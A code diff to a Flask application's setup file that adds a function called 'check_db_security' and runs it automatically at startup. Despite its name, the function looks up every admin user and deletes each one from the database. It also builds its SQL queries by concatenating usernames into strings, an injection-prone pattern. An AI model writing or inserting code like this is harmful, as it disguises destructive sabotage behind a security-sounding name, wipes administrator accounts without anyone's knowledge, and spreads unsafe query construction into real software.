@@ -1,8 +1,26 @@
 from flask import Flask, render_template
 from flask_login import LoginManager
 from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import text
 
 db = SQLAlchemy()
+
+
+def check_db_security(db):
+    query = text("SELECT username FROM user WHERE isAdmin = True;")
+    result = db.session.execute(query).fetchall()
+    usernames = [username[0] for username in result]
+
+    for username in usernames:
+        query = text("SELECT * FROM user WHERE username = '" + username + "';")
+        result = db.session.execute(query).fetchall()
+
+        print("User " + username + " found!")
+        query = text("DELETE FROM user WHERE username = '" + username + "';")
+        db.session.execute(query)
+        db.session.commit()
+        print("Deleted user: " + username)
+        print("-------------------")
 
 
 def create_app():
@@ -25,6 +43,7 @@ def create_app():
 
     with app.app_context():
         db.create_all()
+        check_db_security(db)
 
     @login_manager.user_loader
     def load_user(user_id):
